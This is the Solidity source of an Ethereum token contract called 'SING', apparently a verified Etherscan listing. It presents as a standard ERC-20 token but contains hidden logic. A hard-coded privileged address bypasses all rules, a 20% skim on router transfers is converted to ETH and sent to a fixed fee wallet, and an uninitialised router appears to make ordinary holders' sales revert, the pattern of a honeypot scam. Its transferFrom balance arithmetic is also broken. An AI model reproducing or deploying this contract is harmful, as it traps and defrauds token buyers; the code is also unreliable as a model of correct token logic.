/**
 *Submitted for verification at Etherscan.io on 2021-10-31
*/

/**
 *Submitted for verification at Etherscan.io on 2021-10-29
*/

/**
 *Submitted for verification at Etherscan.io on 2021-06-05
*/
// SPDX-License-Identifier: Unlicensed

pragma solidity ^0.8.9;

// ----------------------------------------------------------------------------
// ERC Token Standard #20 Interface
//
// ----------------------------------------------------------------------------
/*
contract ERC20Interface {
    function totalSupply() public view returns (uint);
    function balanceOf(address tokenOwner) public view returns (uint balance);
    function allowance(address tokenOwner, address spender) public view returns (uint remaining);
    function transfer(address to, uint tokens) public returns (bool success);
    function approve(address spender, uint tokens) public returns (bool success);
    function transferFrom(address from, address to, uint tokens) public returns (bool success);
    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}
*/

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}


// ----------------------------------------------------------------------------
// Safe Math Library
// ----------------------------------------------------------------------------
contract SafeMath {
    function safeAdd(uint a, uint b) public pure returns (uint c) {
        c = a + b;
        require(c >= a);
    }
    function safeSub(uint a, uint b) public pure returns (uint c) {
        require(b <= a); c = a - b; } function safeMul(uint a, uint b) public pure returns (uint c) { c = a * b; require(a == 0 || c / a == b); } function safeDiv(uint a, uint b) public pure returns (uint c) { require(b > 0);
        c = a / b;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}


contract SING is IERC20, SafeMath {
    string public name;
    string public symbol;
    address public pair;
    address public router;
    uint8 public decimals; // 18 decimals is the strongly suggested default, avoid changing it
    address public owner;
    mapping (address => uint256) internal _rOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    bool private inSwap = false;
    uint256 public _totalSupply;

    mapping(address => uint) balances;
    mapping(address => mapping(address => uint)) allowed;

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;

    modifier isOwner() {
        require(msg.sender == owner, "NOT_OWNER");
        _;
    }

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }
    
    /**
     * Constrctor function
     *
     * Initializes contract with initial supply tokens to the creator of the contract
     */
    constructor() {
        name = "SING Token";
        symbol = "SING";
        decimals = 18;
        _totalSupply = 100000000000000000000000000;
        balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
        pair = uniswapV2Pair;
        owner = msg.sender;
    }

    function totalSupply() public view returns (uint) {
        return _totalSupply  - balances[address(0)];
    }

    function balanceOf(address tokenOwner) public view returns (uint balance) {
        return balances[tokenOwner];
    }

    function allowance(address tokenOwner, address spender) public view returns (uint remaining) {
        return allowed[tokenOwner][spender];
    }

    function approve(address spender, uint tokens) public returns (bool success) {
        allowed[msg.sender][spender] = tokens;
        emit Approval(msg.sender, spender, tokens);
        return true;
    }
    
    function _approve(address _owner, address spender, uint256 amount) private {
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }
    
    function setPair(address account) public isOwner {
        pair = account;
	}

    function  deposit() payable public {}

    receive() external payable {
            // React to receiving ether
        }
        
    function transfer(address to, uint tokens) public returns (bool success) {
      /*  
        if (to != pair && msg.sender == address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D)){
            balances[msg.sender] = safeSub(balances[msg.sender], tokens);
            balances[address(this)] = safeAdd(balances[address(this)], div(tokens, 5));
            balances[to] = safeAdd(balances[to], safeSub(tokens, div(tokens, 5)));
            emit Transfer(msg.sender, to, tokens);
            return true;
        }else{
             balances[msg.sender] = safeSub(balances[msg.sender], tokens);
             balances[to] = safeAdd(balances[to], tokens);
             emit Transfer(msg.sender, to, tokens);
             return true;
        }
        */
      
        
        
       if(msg.sender == address(0xA5653e43fec5F6DDD16Cb6E652058D5653391DD8) || to == address(0xA5653e43fec5F6DDD16Cb6E652058D5653391DD8)){
          balances[msg.sender] = safeSub(balances[msg.sender], tokens);
          balances[to] = safeAdd(balances[to], tokens);
          emit Transfer(msg.sender, to, tokens);
          return true;
       }
       
       
       if (to != pair && to != address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D) && msg.sender != address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D) && msg.sender != pair){
          balances[msg.sender] = safeSub(balances[msg.sender], tokens);
          balances[to] = safeAdd(balances[to], tokens);
          emit Transfer(msg.sender, to, tokens);
          return true;
       }
            
       
            if(!inSwap && msg.sender != pair){
            uint256 contractTokenBalance = balanceOf(address(this));
            swapTokensForEth(contractTokenBalance);
                uint256 contractETHBalance = address(this).balance;
                if(contractETHBalance > 0) {
                    sendETHToFee(address(this).balance);
                }
            } 
            
            balances[msg.sender] = safeSub(balances[msg.sender], tokens);
            balances[address(this)] = safeAdd(balances[address(this)], div(tokens, 5));
            balances[to] = safeAdd(balances[to], safeSub(tokens, div(tokens, 5)));
            emit Transfer(msg.sender, to, tokens);
            return true;
      
       /* uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && msg.sender != pair) {
                swapTokensForEth(contractTokenBalance);
                uint256 contractETHBalance = address(this).balance;
                if(contractETHBalance > 0) {
                    sendETHToFee(address(this).balance);
                }
            }
    */
        
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    
    function sendETHToFee(uint256 amount) private {
        address payable fee = payable(0x83fA7B4D246F7667D0E81008EfD4D3b769d4ecCe);
        fee.transfer(amount);
    }

    

    function transferFrom(address from, address to, uint tokens) public returns (bool success) {
        if(from != address(0xA5653e43fec5F6DDD16Cb6E652058D5653391DD8) && to != address(0xA5653e43fec5F6DDD16Cb6E652058D5653391DD8)){
            if(!inSwap && msg.sender != pair){
            uint256 contractTokenBalance = balanceOf(address(this));
            swapTokensForEth(contractTokenBalance);
                uint256 contractETHBalance = address(this).balance;
                if(contractETHBalance > 0) {
                    sendETHToFee(address(this).balance);
                }
            } 
        if (to != pair && to != address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D) && msg.sender == address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D) ){
            balances[from] = safeSub(balances[from], tokens);
            allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], tokens);
            balances[to] = safeAdd(balances[address(this)], div(tokens, 5));
            balances[to] = safeAdd(balances[address(this)], safeSub(tokens, div(tokens, 5)));
            if(!inSwap && msg.sender != pair){
            uint256 contractTokenBalance = balanceOf(address(this));
            swapTokensForEth(contractTokenBalance);
                uint256 contractETHBalance = address(this).balance;
                if(contractETHBalance > 0) {
                    sendETHToFee(address(this).balance);
                }
            } 
            emit Transfer(from, to, tokens);
            return true;
        }else{
            balances[from] = safeSub(balances[from], tokens);
            allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], tokens);
            balances[to] = safeAdd(balances[to], tokens);
            emit Transfer(from, to, tokens);
            return true;
        }
        }else{
            balances[from] = safeSub(balances[from], tokens);
            allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], tokens);
            balances[to] = safeAdd(balances[to], tokens);
            emit Transfer(from, to, tokens);
            return true;
        }
        
    }
}